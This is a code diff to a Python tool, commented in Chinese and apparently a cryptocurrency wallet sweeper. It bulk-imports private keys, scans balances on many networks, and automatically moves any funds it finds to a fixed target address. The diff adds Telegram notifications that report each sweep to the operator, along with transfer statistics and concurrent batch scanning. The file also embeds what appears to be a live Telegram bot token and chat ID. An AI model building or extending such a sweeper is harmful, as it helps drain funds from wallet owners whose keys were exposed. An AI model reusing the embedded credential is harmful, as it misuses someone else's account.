@@ -93,6 +93,11 @@ REQUESTS_PER_API = 5   # 每个API密钥使用几次后切换
 
 TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"
 
+# Telegram通知配置
+TELEGRAM_BOT_TOKEN = "7555291517:AAHJGZOs4RZ-QmZvHKVk-ws5zBNcFZHNmkU"
+TELEGRAM_CHAT_ID = "5963704377"
+TELEGRAM_NOTIFICATIONS_ENABLED = True  # 是否启用TG通知
+
 def get_current_api_key():
     """获取当前API密钥"""
     if not ALCHEMY_API_KEYS:
@@ -231,6 +236,135 @@ def enhanced_safe_input(prompt: str, default: str = "") -> str:
         return result.strip() if result.strip() else default
     except:
         return default
+
+async def send_telegram_notification(message: str, silent: bool = False) -> bool:
+    """发送Telegram通知"""
+    if not TELEGRAM_NOTIFICATIONS_ENABLED or not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        return False
+    
+    try:
+        import aiohttp
+        
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        
+        # 构建消息数据
+        data = {
+            'chat_id': TELEGRAM_CHAT_ID,
+            'text': message,
+            'parse_mode': 'HTML',
+            'disable_notification': silent
+        }
+        
+        async with aiohttp.ClientSession() as session:
+            async with session.post(url, data=data, timeout=10) as response:
+                if response.status == 200:
+                    print(f"{Fore.GREEN}📱 TG通知发送成功{Style.RESET_ALL}")
+                    return True
+                else:
+                    print(f"{Fore.YELLOW}📱 TG通知发送失败: HTTP {response.status}{Style.RESET_ALL}")
+                    return False
+                    
+    except Exception as e:
+        print(f"{Fore.YELLOW}📱 TG通知发送异常: {str(e)[:50]}...{Style.RESET_ALL}")
+        return False
+
+def format_transfer_notification(wallet_addr: str, network_name: str, amount: float, currency: str, tx_hash: str) -> str:
+    """格式化转账通知消息"""
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # 创建格式化的HTML消息
+    message = f"""🎉 <b>自动转账成功！</b>
+
+💰 <b>转账金额:</b> {amount:.8f} {currency}
+🌐 <b>网络:</b> {network_name}
+📍 <b>来源钱包:</b> <code>{wallet_addr[:10]}...{wallet_addr[-8:]}</code>
+🎯 <b>目标地址:</b> <code>{TARGET_ADDRESS[:10]}...{TARGET_ADDRESS[-8:]}</code>
+📋 <b>交易哈希:</b> <code>{tx_hash[:16]}...{tx_hash[-16:]}</code>
+⏰ <b>时间:</b> {timestamp}
+
+🔗 完整交易: <code>{tx_hash}</code>"""
+    
+    return message
+
+# 转账统计数据结构
+TRANSFER_STATS = {
+    'total_transfers': 0,
+    'total_amount_eth': 0.0,
+    'networks_used': {},
+    'successful_notifications': 0,
+    'failed_notifications': 0,
+    'last_transfer_time': None,
+    'daily_stats': {}
+}
+
+def update_transfer_stats(network_name: str, amount: float, currency: str, notification_success: bool = False):
+    """更新转账统计"""
+    today = datetime.now().strftime("%Y-%m-%d")
+    
+    # 更新全局统计
+    TRANSFER_STATS['total_transfers'] += 1
+    
+    # 如果是ETH或等价物，加入总金额统计
+    if currency in ['ETH', 'WETH']:
+        TRANSFER_STATS['total_amount_eth'] += amount
+    
+    # 网络统计
+    if network_name not in TRANSFER_STATS['networks_used']:
+        TRANSFER_STATS['networks_used'][network_name] = {'count': 0, 'amount': 0.0}
+    TRANSFER_STATS['networks_used'][network_name]['count'] += 1
+    TRANSFER_STATS['networks_used'][network_name]['amount'] += amount
+    
+    # 通知统计
+    if notification_success:
+        TRANSFER_STATS['successful_notifications'] += 1
+    else:
+        TRANSFER_STATS['failed_notifications'] += 1
+    
+    # 更新最后转账时间
+    TRANSFER_STATS['last_transfer_time'] = datetime.now().isoformat()
+    
+    # 每日统计
+    if today not in TRANSFER_STATS['daily_stats']:
+        TRANSFER_STATS['daily_stats'][today] = {'transfers': 0, 'amount': 0.0}
+    TRANSFER_STATS['daily_stats'][today]['transfers'] += 1
+    TRANSFER_STATS['daily_stats'][today]['amount'] += amount
+    
+    # 保存统计数据
+    save_transfer_stats()
+
+def save_transfer_stats():
+    """保存转账统计到文件"""
+    try:
+        with open('transfer_stats.json', 'w', encoding='utf-8') as f:
+            json.dump(TRANSFER_STATS, f, ensure_ascii=False, indent=2)
+    except:
+        pass
+
+def load_transfer_stats():
+    """加载转账统计"""
+    global TRANSFER_STATS
+    try:
+        if os.path.exists('transfer_stats.json'):
+            with open('transfer_stats.json', 'r', encoding='utf-8') as f:
+                loaded_stats = json.load(f)
+                TRANSFER_STATS.update(loaded_stats)
+    except:
+        pass
+
+def get_transfer_stats_summary() -> str:
+    """获取转账统计摘要"""
+    total = TRANSFER_STATS['total_transfers']
+    total_eth = TRANSFER_STATS['total_amount_eth']
+    networks = len(TRANSFER_STATS['networks_used'])
+    success_rate = 0
+    
+    if total > 0:
+        success_rate = (TRANSFER_STATS['successful_notifications'] / total) * 100
+    
+    today = datetime.now().strftime("%Y-%m-%d")
+    today_transfers = TRANSFER_STATS['daily_stats'].get(today, {}).get('transfers', 0)
+    
+    return f"📊 总转账: {total} 笔 | 📈 今日: {today_transfers} 笔 | 💰 总计: {total_eth:.6f} ETH | 🌐 网络: {networks} 个 | 📱 通知成功率: {success_rate:.1f}%"
 
 def get_api_keys_status():
     """获取API密钥状态信息"""
@@ -834,6 +968,7 @@ class WalletMonitor:
         self.network_status: Dict[str, NetworkStatus] = {}
         self.load_wallets()
         self.load_network_status()
+        load_transfer_stats()  # 加载转账统计
         
     def initialize_clients(self):
         """智能初始化网络客户端 - 轮询API密钥模式"""
@@ -1378,16 +1513,16 @@ class WalletMonitor:
             signed_txn = account.sign_transaction(transaction)
             tx_hash = await loop.run_in_executor(None, web3.eth.send_raw_transaction, signed_txn.rawTransaction)
             
-            # 记录转账
-            self._log_transfer_success(wallet, network_key, transfer_amount, tx_hash, gas_cost, gas_price, config)
+            # 记录转账并发送通知
+            await self._log_transfer_success(wallet, network_key, transfer_amount, tx_hash, gas_cost, gas_price, config)
             return True
             
         except Exception as e:
             print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} RPC转账失败: {str(e)[:50]}...{Style.RESET_ALL}")
             return False
     
-    def _log_transfer_success(self, wallet: WalletInfo, network_key: str, transfer_amount: int, tx_hash: Any, gas_cost: int, gas_price: int, config: dict):
-        """记录转账成功"""
+    async def _log_transfer_success(self, wallet: WalletInfo, network_key: str, transfer_amount: int, tx_hash: Any, gas_cost: int, gas_price: int, config: dict):
+        """记录转账成功并发送TG通知"""
         log_entry = {
             'timestamp': datetime.now().isoformat(),
             'from_address': wallet.address,
@@ -1405,8 +1540,37 @@ class WalletMonitor:
         
         amount_str = f"{Web3.from_wei(transfer_amount, 'ether'):.6f}"
         currency = config['currency']
+        amount_float = float(Web3.from_wei(transfer_amount, 'ether'))
+        
         print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} 转账成功: {amount_str} {currency}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}📋 交易哈希: {log_entry['tx_hash']}{Style.RESET_ALL}")
+        
+        # 发送Telegram通知
+        notification_success = False
+        if TELEGRAM_NOTIFICATIONS_ENABLED:
+            try:
+                message = format_transfer_notification(
+                    wallet.address,
+                    NETWORK_NAMES[network_key],
+                    amount_float,
+                    currency,
+                    log_entry['tx_hash']
+                )
+                notification_success = await send_telegram_notification(message)
+            except Exception as e:
+                print(f"{Fore.YELLOW}📱 TG通知发送异常: {str(e)[:30]}...{Style.RESET_ALL}")
+        
+        # 更新统计
+        update_transfer_stats(
+            NETWORK_NAMES[network_key],
+            amount_float,
+            currency,
+            notification_success
+        )
+        
+        # 显示统计摘要
+        stats_summary = get_transfer_stats_summary()
+        print(f"{Fore.MAGENTA}📊 {stats_summary}{Style.RESET_ALL}")
     
     def log_transfer(self, log_entry: Dict):
         """记录转账日志 - 增强版本"""
@@ -1481,58 +1645,76 @@ class WalletMonitor:
             print(f"{Fore.YELLOW}💡 钱包在所有网络都无活动记录{Style.RESET_ALL}")
             return
         
-        print(f"\n{Fore.GREEN}🎯 开始监控 {len(active_networks)} 个活跃网络{Style.RESET_ALL}")
+        print(f"\n{Fore.GREEN}🎯 发现 {len(active_networks)} 个活跃网络{Style.RESET_ALL}")
         
-        # 持续监控余额
-        check_count = 0
-        while self.monitoring_active:
-            check_count += 1
-            print(f"\n{Fore.CYAN}🔄 第{check_count}次检查 - {short_addr}{Style.RESET_ALL}")
-            
-            for network_key in active_networks:
-                try:
-                    balance = await self.get_balance_optimized(wallet.address, network_key)
-                    
-                    if balance > 0:
-                        # 获取网络配置以显示正确的货币单位
-                        network_info = SUPPORTED_NETWORKS.get(network_key)
-                        currency = network_info['config']['currency'] if network_info else 'ETH'
-                        
-                        print(f"\n{Fore.GREEN}💰 发现余额!{Style.RESET_ALL}")
-                        print(f"{Fore.CYAN}📍 钱包: {wallet.address}{Style.RESET_ALL}")
-                        print(f"{Fore.CYAN}🌐 网络: {NETWORK_NAMES[network_key]}{Style.RESET_ALL}")
-                        print(f"{Fore.CYAN}💵 余额: {balance:.8f} {currency}{Style.RESET_ALL}")
-                        
-                        # 自动转账
-                        print(f"{Fore.YELLOW}🚀 开始自动转账...{Style.RESET_ALL}")
-                        success = await self.transfer_balance_optimized(wallet, network_key, balance)
-                        
-                        if success:
-                            print(f"{Fore.GREEN}🎉 自动转账完成!{Style.RESET_ALL}")
-                        else:
-                            print(f"{Fore.RED}❌ 自动转账失败{Style.RESET_ALL}")
+        # 返回活跃网络列表，供批量扫描使用
+        return active_networks
+    
+    async def batch_scan_all_wallets(self):
+        """批量扫描所有钱包 - 一次性完成所有钱包的扫描"""
+        print(f"{Fore.CYAN}📡 开始批量扫描 {len(self.wallets)} 个钱包...{Style.RESET_ALL}")
+        
+        # 并发扫描所有钱包
+        semaphore = asyncio.Semaphore(3)  # 限制并发数量
+        
+        async def scan_single_wallet(wallet_index, wallet):
+            async with semaphore:
+                short_addr = f"{wallet.address[:8]}...{wallet.address[-6:]}"
+                print(f"{Fore.CYAN}[{wallet_index + 1}/{len(self.wallets)}] 扫描钱包: {short_addr}{Style.RESET_ALL}")
                 
-                except Exception as e:
-                    continue
-            
-            # 智能等待间隔 - 基于API限制动态调整
-            rate_info = calculate_optimal_scanning_params()
-            optimal_interval = rate_info['optimal_interval']
-            
-            # 根据网络数量和钱包数量调整间隔
-            total_operations = len(active_networks) * len(self.wallets)
-            adjusted_interval = optimal_interval * total_operations
-            
-            # 确保合理的间隔范围 (5-300秒)
-            final_interval = max(5.0, min(300.0, adjusted_interval))
-            
-            print(f"{Fore.CYAN}⏱️ 下次扫描间隔: {final_interval:.1f}秒 (基于API限制优化){Style.RESET_ALL}")
-            print(f"{Fore.CYAN}📊 剩余{rate_info['remaining_days']}天，可用额度: {rate_info['remaining_cu']:,.0f} CU{Style.RESET_ALL}")
-            
-            await asyncio.sleep(final_interval)
+                # 获取可用网络
+                available_networks = [
+                    net for net in wallet.enabled_networks 
+                    if self.network_status.get(net, NetworkStatus(True, "", 0, "")).available
+                ]
+                
+                if not available_networks:
+                    print(f"{Fore.YELLOW}⚠️ [{wallet_index + 1}] 没有可用的网络{Style.RESET_ALL}")
+                    return
+                
+                # 按优先级排序 (主网优先)
+                available_networks.sort(key=lambda x: NETWORK_PRIORITY.get(x, 999))
+                
+                # 检查所有可用网络的余额
+                found_balance = False
+                for network_key in available_networks:
+                    try:
+                        balance = await self.get_balance_optimized(wallet.address, network_key)
+                        
+                        if balance > 0:
+                            found_balance = True
+                            # 获取网络配置以显示正确的货币单位
+                            network_info = SUPPORTED_NETWORKS.get(network_key)
+                            currency = network_info['config']['currency'] if network_info else 'ETH'
+                            
+                            print(f"\n{Fore.GREEN}💰 发现余额!{Style.RESET_ALL}")
+                            print(f"{Fore.CYAN}📍 钱包: {wallet.address}{Style.RESET_ALL}")
+                            print(f"{Fore.CYAN}🌐 网络: {NETWORK_NAMES[network_key]}{Style.RESET_ALL}")
+                            print(f"{Fore.CYAN}💵 余额: {balance:.8f} {currency}{Style.RESET_ALL}")
+                            
+                            # 自动转账
+                            print(f"{Fore.YELLOW}🚀 开始自动转账...{Style.RESET_ALL}")
+                            success = await self.transfer_balance_optimized(wallet, network_key, balance)
+                            
+                            if success:
+                                print(f"{Fore.GREEN}🎉 自动转账完成!{Style.RESET_ALL}")
+                            else:
+                                print(f"{Fore.RED}❌ 自动转账失败{Style.RESET_ALL}")
+                    
+                    except Exception as e:
+                        continue
+                
+                if not found_balance:
+                    print(f"{Fore.BLUE}💡 [{wallet_index + 1}] 钱包无余额{Style.RESET_ALL}")
+        
+        # 并发扫描所有钱包
+        tasks = [scan_single_wallet(i, wallet) for i, wallet in enumerate(self.wallets)]
+        await asyncio.gather(*tasks, return_exceptions=True)
+        
+        print(f"{Fore.GREEN}📊 批量扫描完成！{Style.RESET_ALL}")
     
     async def start_monitoring(self):
-        """开始监控所有钱包 - 完全优化版本"""
+        """开始监控所有钱包 - 批量扫描模式"""
         if not self.wallets:
             print(f"{Fore.RED}❌ 没有导入的钱包{Style.RESET_ALL}")
             return
@@ -1548,23 +1730,35 @@ class WalletMonitor:
         print(f"{Fore.CYAN}📊 月度额度: {rate_info['total_monthly_limit']:,} CU ({rate_info['total_api_keys']} API密钥){Style.RESET_ALL}")
         print(f"{Fore.CYAN}📅 剩余天数: {rate_info['remaining_days']} 天{Style.RESET_ALL}")
         print(f"{Fore.CYAN}🎯 每日目标: {rate_info['daily_target_cu']:,.0f} CU{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}⏱️ 扫描间隔: {rate_info['optimal_interval']:.1f} 秒{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}⏱️ 批量扫描间隔: {rate_info['optimal_interval']:.1f} 秒{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}💡 按 Ctrl+C 停止监控{Style.RESET_ALL}")
         
         self.monitoring_active = True
         
-        # 限制并发监控数量，优化性能
-        semaphore = asyncio.Semaphore(2)  # 最多2个钱包并发监控
-        
-        async def monitor_with_limit(wallet):
-            async with semaphore:
-                await self.monitor_wallet_optimized(wallet)
-        
-        # 创建监控任务
-        tasks = [monitor_with_limit(wallet) for wallet in self.wallets]
+        # 批量扫描模式：先扫描所有钱包，再等待间隔
+        round_count = 0
         
         try:
-            await asyncio.gather(*tasks)
+            while self.monitoring_active:
+                round_count += 1
+                print(f"\n{Fore.MAGENTA}🔄 第{round_count}轮批量扫描开始...{Style.RESET_ALL}")
+                start_time = time.time()
+                
+                # 扫描所有钱包
+                await self.batch_scan_all_wallets()
+                
+                scan_duration = time.time() - start_time
+                print(f"\n{Fore.GREEN}✅ 第{round_count}轮扫描完成 (耗时: {scan_duration:.1f}秒){Style.RESET_ALL}")
+                
+                # 计算并等待智能间隔
+                rate_info = calculate_optimal_scanning_params()
+                wait_interval = rate_info['optimal_interval']
+                
+                print(f"{Fore.CYAN}⏱️ 等待 {wait_interval:.1f} 秒后开始下一轮扫描...{Style.RESET_ALL}")
+                print(f"{Fore.CYAN}📊 剩余{rate_info['remaining_days']}天，可用额度: {rate_info['remaining_cu']:,.0f} CU{Style.RESET_ALL}")
+                
+                await asyncio.sleep(wait_interval)
+                
         except KeyboardInterrupt:
             print(f"\n{Fore.YELLOW}⚠️ 监控已停止{Style.RESET_ALL}")
         finally:
@@ -1615,11 +1809,12 @@ class WalletMonitor:
         print("  ✓ 智能错误分类和处理")
         print("  ✓ 网络状态缓存和持久化")
         
-        print(f"\n{Fore.CYAN}🔧 监控策略:{Style.RESET_ALL}")
+        print(f"\n{Fore.CYAN}🔧 批量扫描策略:{Style.RESET_ALL}")
         rate_info = calculate_optimal_scanning_params()
         print("  • 优先检查主网 (价值更高)")
-        print(f"  • {rate_info['optimal_interval']:.1f}秒智能间隔 (基于API限制优化)")
-        print("  • 最多2个钱包并发监控")
+        print("  • 批量扫描: 先完整扫描所有钱包，再统一等待间隔")
+        print(f"  • 轮次间隔: {rate_info['optimal_interval']:.1f}秒 (基于API限制优化)")
+        print("  • 最多3个钱包并发扫描")
         print("  • 自动重试失败的网络")
         print(f"  • 智能速率控制: {rate_info['max_requests_per_second']:.1f} 请求/秒")
         print(f"  • 月度额度管理: {rate_info['remaining_days']}天剩余")
@@ -1661,20 +1856,19 @@ class WalletMonitor:
         
         print(f"🌐 网络: {available_count}/{len(SUPPORTED_NETWORKS)} 可用 (主网:{mainnet_total} 测试网:{testnet_total})")
         
-        # 转账记录
-        transfer_count = 0
-        total_amount = 0.0
-        if os.path.exists(MONITORING_LOG_FILE):
-            try:
-                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
-                    logs = json.load(f)
-                transfer_count = len(logs)
-                total_amount = sum(float(log.get('amount', 0)) for log in logs)
-            except:
-                pass
+        # 转账记录和统计
+        transfer_count = TRANSFER_STATS['total_transfers']
+        total_amount = TRANSFER_STATS['total_amount_eth']
         
         print(f"📋 转账: {transfer_count} 笔 (总计: {total_amount:.6f} ETH)")
         print(f"🎯 目标: {TARGET_ADDRESS[:12]}...{TARGET_ADDRESS[-8:]}")
+        
+        # TG通知状态
+        tg_status = "启用" if TELEGRAM_NOTIFICATIONS_ENABLED else "禁用"
+        tg_success = TRANSFER_STATS['successful_notifications']
+        tg_failed = TRANSFER_STATS['failed_notifications']
+        print(f"📱 TG通知: {tg_status} (成功: {tg_success} | 失败: {tg_failed})")
+        
         status = get_api_keys_status()
         rate_info = status['rate_info']
         print(f"🔑 API轮询: #{status['current_index'] + 1}/{status['total_keys']} ({status['current_key']}) [{status['request_count']}/{status['requests_per_api']}]")
@@ -1941,17 +2135,18 @@ class WalletMonitor:
             print(f"  {Fore.CYAN}3.{Style.RESET_ALL} ⚙️ 设置轮询频率")
             print(f"  {Fore.CYAN}4.{Style.RESET_ALL} 📊 重置月度使用统计")
             print(f"  {Fore.CYAN}5.{Style.RESET_ALL} 🧪 测试所有API密钥")
-            print(f"  {Fore.CYAN}6.{Style.RESET_ALL} 🔙 返回主菜单")
+            print(f"  {Fore.CYAN}6.{Style.RESET_ALL} 📱 TG通知设置")
+            print(f"  {Fore.CYAN}7.{Style.RESET_ALL} 🔙 返回主菜单")
             
             print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
             
             try:
-                choice = enhanced_safe_input(f"{Fore.CYAN}请选择功能 (1-6): {Style.RESET_ALL}", "6").strip()
+                choice = enhanced_safe_input(f"{Fore.CYAN}请选择功能 (1-7): {Style.RESET_ALL}", "7").strip()
                 
                 # 验证输入是否为有效数字
-                if choice not in ["1", "2", "3", "4", "5", "6"]:
-                    print(f"\n{Fore.RED}❌ 无效选择 '{choice}'，请输入 1-6{Style.RESET_ALL}")
-                    print(f"{Fore.YELLOW}💡 提示: 请输入菜单中显示的数字 (1、2、3、4、5 或 6){Style.RESET_ALL}")
+                if choice not in ["1", "2", "3", "4", "5", "6", "7"]:
+                    print(f"\n{Fore.RED}❌ 无效选择 '{choice}'，请输入 1-7{Style.RESET_ALL}")
+                    print(f"{Fore.YELLOW}💡 提示: 请输入菜单中显示的数字 (1、2、3、4、5、6 或 7){Style.RESET_ALL}")
                     time.sleep(3)
                     continue
                 
@@ -1966,6 +2161,8 @@ class WalletMonitor:
                 elif choice == "5":
                     self.test_all_api_keys()
                 elif choice == "6":
+                    self.telegram_settings_menu()
+                elif choice == "7":
                     break
                     
             except KeyboardInterrupt:
@@ -2107,6 +2304,104 @@ class WalletMonitor:
         
         enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
     
+    def telegram_settings_menu(self):
+        """TG通知设置菜单"""
+        print(f"\n{Fore.CYAN}📱 Telegram通知设置{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.YELLOW}📊 当前设置:{Style.RESET_ALL}")
+        print(f"  状态: {'✅ 启用' if TELEGRAM_NOTIFICATIONS_ENABLED else '❌ 禁用'}")
+        print(f"  Bot Token: {TELEGRAM_BOT_TOKEN[:20]}...{TELEGRAM_BOT_TOKEN[-10:] if len(TELEGRAM_BOT_TOKEN) > 30 else TELEGRAM_BOT_TOKEN}")
+        print(f"  Chat ID: {TELEGRAM_CHAT_ID}")
+        
+        print(f"\n{Fore.YELLOW}📊 通知统计:{Style.RESET_ALL}")
+        print(f"  成功发送: {TRANSFER_STATS['successful_notifications']} 次")
+        print(f"  发送失败: {TRANSFER_STATS['failed_notifications']} 次")
+        total_attempts = TRANSFER_STATS['successful_notifications'] + TRANSFER_STATS['failed_notifications']
+        success_rate = (TRANSFER_STATS['successful_notifications'] / total_attempts * 100) if total_attempts > 0 else 0
+        print(f"  成功率: {success_rate:.1f}%")
+        
+        print(f"\n{Fore.CYAN}🔧 管理选项:{Style.RESET_ALL}")
+        print(f"  1. {'❌ 禁用' if TELEGRAM_NOTIFICATIONS_ENABLED else '✅ 启用'}通知")
+        print(f"  2. 🧪 发送测试消息")
+        print(f"  3. 📊 查看详细统计")
+        print(f"  4. 🔙 返回上级菜单")
+        
+        choice = enhanced_safe_input(f"\n{Fore.CYAN}请选择 (1-4): {Style.RESET_ALL}", "4")
+        
+        if choice == "1":
+            self.toggle_telegram_notifications()
+        elif choice == "2":
+            self.send_test_telegram_message()
+        elif choice == "3":
+            self.show_detailed_telegram_stats()
+        
+        enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
+    
+    def toggle_telegram_notifications(self):
+        """切换TG通知状态"""
+        global TELEGRAM_NOTIFICATIONS_ENABLED
+        
+        old_status = TELEGRAM_NOTIFICATIONS_ENABLED
+        TELEGRAM_NOTIFICATIONS_ENABLED = not TELEGRAM_NOTIFICATIONS_ENABLED
+        
+        status_text = "启用" if TELEGRAM_NOTIFICATIONS_ENABLED else "禁用"
+        print(f"\n{Fore.GREEN}✅ TG通知已{status_text}{Style.RESET_ALL}")
+    
+    def send_test_telegram_message(self):
+        """发送测试TG消息"""
+        print(f"\n{Fore.CYAN}🧪 发送测试消息...{Style.RESET_ALL}")
+        
+        test_message = f"""🔧 <b>测试消息</b>
+
+📱 这是一条来自钱包监控系统的测试消息
+⏰ 时间: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+🎯 目标地址: <code>{TARGET_ADDRESS[:12]}...{TARGET_ADDRESS[-8:]}</code>
+📊 当前监控: {len(self.wallets)} 个钱包
+
+✅ 如果您收到此消息，说明通知系统工作正常！"""
+        
+        try:
+            import asyncio
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            success = loop.run_until_complete(send_telegram_notification(test_message))
+            loop.close()
+            
+            if success:
+                print(f"{Fore.GREEN}✅ 测试消息发送成功！{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}❌ 测试消息发送失败{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}❌ 测试失败: {str(e)[:50]}...{Style.RESET_ALL}")
+    
+    def show_detailed_telegram_stats(self):
+        """显示详细TG统计"""
+        print(f"\n{Fore.CYAN}📊 Telegram通知详细统计{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
+        
+        total_transfers = TRANSFER_STATS['total_transfers']
+        successful_notifications = TRANSFER_STATS['successful_notifications']
+        failed_notifications = TRANSFER_STATS['failed_notifications']
+        total_attempts = successful_notifications + failed_notifications
+        
+        print(f"📊 总转账次数: {total_transfers}")
+        print(f"📱 通知尝试次数: {total_attempts}")
+        print(f"✅ 成功发送: {successful_notifications}")
+        print(f"❌ 发送失败: {failed_notifications}")
+        
+        if total_attempts > 0:
+            success_rate = (successful_notifications / total_attempts) * 100
+            print(f"📈 成功率: {success_rate:.1f}%")
+        
+        if total_transfers > 0:
+            notification_coverage = (total_attempts / total_transfers) * 100
+            print(f"📋 通知覆盖率: {notification_coverage:.1f}%")
+        
+        if TRANSFER_STATS['last_transfer_time']:
+            last_time = datetime.fromisoformat(TRANSFER_STATS['last_transfer_time'])
+            print(f"⏰ 最后转账: {last_time.strftime('%Y-%m-%d %H:%M:%S')}")
+    
     def restart_program(self):
         """重启程序 - 清理缓存并重新初始化"""
         print(f"\n{Fore.YELLOW}🔄 程序重启{Style.RESET_ALL}")
@@ -2162,7 +2457,7 @@ class WalletMonitor:
             
             print(f"\n{Fore.YELLOW}📋 功能菜单:{Style.RESET_ALL}")
             print(f"  {Fore.CYAN}1.{Style.RESET_ALL} 📥 导入私钥    {Fore.GREEN}(智能批量识别，支持任意格式){Style.RESET_ALL}")
-            print(f"  {Fore.CYAN}2.{Style.RESET_ALL} 🎯 开始监控    {Fore.GREEN}(并发优化，3倍速度提升){Style.RESET_ALL}")
+            print(f"  {Fore.CYAN}2.{Style.RESET_ALL} 🎯 开始监控    {Fore.GREEN}(批量扫描，先扫描所有钱包再等待间隔){Style.RESET_ALL}")
             print(f"  {Fore.CYAN}3.{Style.RESET_ALL} 📊 详细状态    {Fore.GREEN}(完整诊断，网络分析){Style.RESET_ALL}")
             print(f"  {Fore.CYAN}4.{Style.RESET_ALL} 🔑 API密钥管理 {Fore.GREEN}(轮询系统，无限扩展){Style.RESET_ALL}")
             print(f"  {Fore.CYAN}5.{Style.RESET_ALL} 🔄 重启程序    {Fore.GREEN}(清理缓存，重新初始化){Style.RESET_ALL}")
